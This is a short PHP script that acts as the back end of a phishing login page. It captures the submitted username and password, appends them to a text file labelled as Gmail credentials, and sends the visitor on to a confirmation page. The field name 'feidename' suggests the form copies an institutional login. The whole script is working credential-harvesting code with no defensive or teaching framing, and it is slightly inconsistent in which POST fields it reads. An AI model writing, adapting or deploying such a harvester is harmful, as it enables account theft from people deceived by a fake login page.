<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the username and password from the POST request
$username = $_POST['feidename'];
$password = $_POST['password'];

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

// Redirect to a confirmation page
header('Location: confirmation.html');
exit();
?>
